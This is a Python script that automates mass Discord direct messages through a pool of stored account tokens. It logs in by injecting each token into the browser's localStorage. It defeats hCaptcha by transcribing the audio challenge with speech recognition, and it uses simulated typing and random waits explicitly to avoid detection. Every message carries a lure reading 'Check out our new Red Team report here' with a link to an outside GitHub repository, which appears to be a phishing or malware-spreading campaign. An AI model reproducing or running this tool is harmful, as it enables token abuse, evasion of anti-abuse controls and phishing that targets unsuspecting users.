import asyncio
import random
import os
import json
import re
import requests
from playwright.async_api import async_playwright
import speech_recognition as sr
from pydub import AudioSegment
from database import init_db, get_active_tokens, update_token_status

# Ensure required directories exist
os.makedirs("temp", exist_ok=True)

async def solve_audio_hcaptcha(page):
    """
    Attempts to solve hCaptcha using the audio accessibility bypass.
    """
    try:
        # 1. Switch to the checkbox iframe
        iframe_checkbox = await page.wait_for_selector('iframe[title*="checkbox"]', timeout=5000)
        frame_checkbox = await iframe_checkbox.content_frame()
        await frame_checkbox.click('#checkbox')
        await asyncio.sleep(2)

        # 2. Check if the image grid appeared (meaning we need to solve)
        iframe_content = await page.wait_for_selector('iframe[title*="content"]', timeout=5000)
        frame_content = await iframe_content.content_frame()

        # 3. Click the accessibility/audio button
        await frame_content.click('#label-audio')
        await asyncio.sleep(2)

        # 4. Get the audio source URL
        audio_url = await frame_content.get_attribute('#audio-source', 'src')
        if not audio_url:
            print("[CAPTCHA] Audio URL not found.")
            return False

        print(f"[CAPTCHA] Downloading audio challenge: {audio_url}")

        # 5. Download and process audio
        response = requests.get(audio_url)
        with open("temp/challenge.mp3", "wb") as f:
            f.write(response.content)

        # Convert mp3 to wav for SpeechRecognition
        audio = AudioSegment.from_mp3("temp/challenge.mp3")
        audio.export("temp/challenge.wav", format="wav")

        # 6. Speech to Text
        recognizer = sr.Recognizer()
        with sr.AudioFile("temp/challenge.wav") as source:
            audio_data = recognizer.record(source)
            text = recognizer.recognize_google(audio_data)
            print(f"[CAPTCHA] Decoded text: {text}")

        # 7. Enter the text and submit
        await frame_content.fill('#audio-response', text)
        await page.keyboard.press("Enter")
        await asyncio.sleep(2)

        print("[CAPTCHA] Audio challenge submitted.")
        return True

    except Exception as e:
        print(f"[CAPTCHA] Audio solver failed: {e}")
        return False

async def send_dm_browser(token, user_id, message):
    async with async_playwright() as p:
        # Non-headless so LO can see and solve if needed
        browser = await p.chromium.launch(headless=False)
        context = await browser.new_context(
            viewport={'width': 1280, 'height': 720},
            user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36"
        )
        page = await context.new_page()

        print(f"[BROWSER] Attempting login with token for target {user_id}...")

        await page.goto("https://discord.com/login")
        await page.evaluate(f"""
            (function() {{
                function login(token) {{
                    setInterval(() => {{
                        document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${{token}}"`;
                    }}, 50);
                    setTimeout(() => {{
                        location.reload();
                    }}, 2500);
                }}
                login("{token}");
            }})();
        """)

        try:
            # Wait for main UI
            await page.wait_for_selector('nav[aria-label="Servers"]', timeout=20000)
            print("[BROWSER] Login successful.")
        except:
            print("[BROWSER] Login failed. Check token or if captcha appeared during login.")
            # If login fails due to captcha, try to solve it
            if await solve_audio_hcaptcha(page):
                await asyncio.sleep(5) # Wait for reload
            else:
                print("[INPUT] Please solve any login captcha manually and press Enter here...")
                await asyncio.get_event_loop().run_in_executor(None, input)

        # Navigate to DM
        await page.goto(f"https://discord.com/channels/@me/{user_id}")
        await asyncio.sleep(random.uniform(3, 6))

        try:
            # Type and send
            chat_input = await page.wait_for_selector('div[role="textbox"]', timeout=10000)
            await chat_input.click()

            # Typing emulation
            for char in message:
                await chat_input.type(char, delay=random.uniform(30, 100))

            await page.keyboard.press("Enter")
            print(f"[SUCCESS] Message sent to {user_id}")
            await asyncio.sleep(2)
        except Exception as e:
            print(f"[ERROR] Failed to send: {e}")
            # Likely captcha or block
            print("[CAPTCHA] Checking for captcha...")
            if await solve_audio_hcaptcha(page):
                 print("[CAPTCHA] Automated solver finished.")
            else:
                 print("[INPUT] Automated solver failed. Please solve manually and press Enter...")
                 await asyncio.get_event_loop().run_in_executor(None, input)

        await browser.close()

async def run_browser_mailing():
    init_db()
    ids = []
    if os.path.exists('ids.txt'):
        with open('ids.txt', 'r') as f:
            ids = [line.strip() for line in f if line.strip()]

    tokens = get_active_tokens()
    if not tokens:
        print("[!] No active tokens found.")
        return

    # Configuration for mailing
    current_token_idx = 0
    message_template = "Hello! Check out our new Red Team report here: https://github.com/mdhesshermd-oss/fix"

    # Process extracted IDs
    for uid in ids:
        token_info = tokens[current_token_idx]
        print(f"\n[SYSTEM] Mailing ID {uid} using token {token_info['username']}")

        await send_dm_browser(token_info['token'], uid, message_template)

        # Delay between messages to avoid detection
        wait = random.randint(120, 300)
        print(f"[TIMER] Waiting {wait} seconds before next DM...")
        await asyncio.sleep(wait)

        # Rotate token if needed (optional)
        # current_token_idx = (current_token_idx + 1) % len(tokens)

if __name__ == "__main__":
    try:
        asyncio.run(run_browser_mailing())
    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")
